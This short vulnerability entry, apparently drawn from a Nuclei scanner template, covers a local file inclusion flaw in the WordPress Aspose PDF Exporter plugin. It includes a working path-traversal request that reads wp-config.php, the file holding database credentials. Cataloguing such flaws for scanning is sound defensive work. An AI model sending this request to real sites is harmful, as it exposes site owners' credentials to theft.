# Vulnerability: WordPress Aspose PDF Exporter - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`aspose-pdf-file-download.yaml`)

## Description
WordPress Aspose PDF Exporter is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=../../../wp-config.php
```

